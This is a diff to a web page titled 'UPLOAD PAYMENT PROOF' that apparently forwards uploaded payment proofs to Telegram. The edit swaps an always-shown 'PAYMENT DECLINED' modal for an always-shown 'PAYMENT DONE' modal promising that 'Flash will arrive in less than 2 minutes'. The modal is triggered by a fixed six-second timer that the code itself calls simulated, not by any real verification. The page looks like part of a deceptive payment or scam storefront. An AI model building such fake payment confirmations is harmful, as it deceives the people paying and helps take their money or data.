@@ -18,11 +18,15 @@
             --border-color: #38383a;
             --back-button-color: #FFFFFF; 
             
-            /* Neon Colors - Focusing on Red (Matching original) */
-            --neon-red: #FF3B30; /* iOS Red */
+            /* Neon Colors */
+            --neon-red: #FF3B30; /* iOS Red (for buttons/focus) */
             --neon-shadow: rgba(255, 59, 48, 0.7); 
             --input-bg-dark: #1F1F1F; 
             --error-color: #FF3B30;
+            
+            /* Neon Green for Success Modal */
+            --neon-green: #34C759; /* iOS Green */
+            --success-shadow: rgba(52, 199, 89, 0.7);
         }
 
         * {
@@ -37,7 +41,7 @@
         /* Base Body Styling */
         body {
             color: var(--text-color);
-            min-height: 100vh;
+            min-height: 10vh;
             display: flex;
             justify-content: center;
             align-items: center; 
@@ -48,7 +52,7 @@
             position: relative; 
         }
 
-        /* --- Video Background Styling (ADDED) --- */
+        /* --- Video Background Styling --- */
         #video-background {
             position: fixed;
             right: 0;
@@ -195,17 +199,26 @@
         .modal-content {
             background: rgba(28, 28, 30, 0.9); /* Tertiary BG with transparency */
             border-radius: 16px;
-            border: 1px solid var(--neon-red);
-            box-shadow: 0 0 30px var(--neon-shadow);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
         }
         
+        /* SUCCESS MODAL STYLING (New/Modified) */
+        .success-modal .modal-content {
+            border: 1px solid var(--neon-green);
+            box-shadow: 0 0 30px var(--success-shadow);
+        }
+        
+        .success-modal .modal-content h2 {
+            color: var(--neon-green);
+        }
+        
+        /* Decline modal for reference, keeping it original in case of future use */
         .decline-modal .modal-content {
             border-color: var(--error-color);
             box-shadow: 0 0 30px rgba(255, 59, 48, 0.9);
         }
-        
-        .modal-content h2 {
-            color: var(--error-color);
+        .decline-modal .modal-content h2 {
+             color: var(--error-color);
         }
 
         .copy-message {
@@ -226,11 +239,13 @@
 </head>
 <body class="font-sans">
 
+    <!-- Video Background -->
     <video autoplay muted loop playsinline id="video-background">
         <source src="background2.mp4" type="video/mp4">
         Your browser does not support the video tag.
     </video>
     
+    <!-- Fixed Back Button -->
     <div class="back-button-container">
         <a href="payment.html" class="back-button" aria-label="Go back to Payment Selection">
             <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
@@ -238,6 +253,7 @@
         </a>
     </div>
 
+    <!-- Main Content Container (Glass Effect) -->
     <div class="container">
         <div class="title">UPLOAD PAYMENT PROOF</div>
         <div class="flex flex-col items-center">
@@ -253,6 +269,7 @@
         </button>
     </div>
 
+    <!-- 1. Loading Modal (No Change) -->
     <div id="loading-modal" class="fixed inset-0 hidden items-center justify-center z-50 modal-overlay p-4">
         <div class="modal-content p-8 flex flex-col items-center max-w-xs">
             <div class="loader mb-4"></div>
@@ -260,6 +277,21 @@
         </div>
     </div>
 
+    <!-- 2. Success Modal (Modified) -->
+    <div id="success-modal" class="fixed inset-0 hidden items-center justify-center z-50 modal-overlay p-4 success-modal">
+        <div class="modal-content p-8 text-center max-w-xs">
+            <!-- Updated Title -->
+            <h2 class="text-2xl font-bold mb-4">PAYMENT DONE</h2>
+            <!-- Updated Body Message -->
+            <p class="text-sm text-secondary-text-color">
+                <span class="text-white font-bold">Order submitted.</span>
+                <br>
+                Flash will arrive in less than 2 minutes.
+            </p>
+        </div>
+    </div>
+
+    <!-- Decline Modal (Kept Hidden and separate) -->
     <div id="decline-modal" class="fixed inset-0 hidden items-center justify-center z-50 modal-overlay p-4 decline-modal">
         <div class="modal-content p-8 text-center max-w-xs">
             <h2 class="text-2xl font-bold mb-4 text-error-color">PAYMENT DECLINED</h2>
@@ -278,7 +310,9 @@
         const submitBtn = document.getElementById('submit-btn');
         const loadingModal = document.getElementById('loading-modal');
         const loadingText = document.getElementById('loading-text');
-        const declineModal = document.getElementById('decline-modal');
+        
+        // --- Reference to the new success modal ---
+        const successModal = document.getElementById('success-modal');
         
         // Define the transition messages
         const loadingMessages = [
@@ -374,21 +408,21 @@
                 console.error("Failed to send to Telegram:", error);
             }
             
-            // 5. Show Decline Modal after 6 seconds (as per original logic)
+            // 5. Show Success Modal after 6 seconds (Simulating processing completion)
             setTimeout(() => {
                 clearInterval(intervalId);
                 
-                // Hide loading, show decline
+                // Hide loading, show success
                 loadingModal.classList.remove('flex');
                 loadingModal.classList.add('hidden');
                 
-                declineModal.classList.remove('hidden');
-                declineModal.classList.add('flex');
+                successModal.classList.remove('hidden');
+                successModal.classList.add('flex');
                 
-                // Optional: Automatically close decline modal after a few seconds
+                // Optional: Automatically close success modal after a few seconds
                 setTimeout(() => {
-                    declineModal.classList.remove('flex');
-                    declineModal.classList.add('hidden');
+                    successModal.classList.remove('flex');
+                    successModal.classList.add('hidden');
                     // Optional: Redirect back to payment.html
                     // window.location.href = "payment.html"; 
                 }, 5000); 
@@ -400,3 +434,4 @@
 
 </body>
 </html>
+
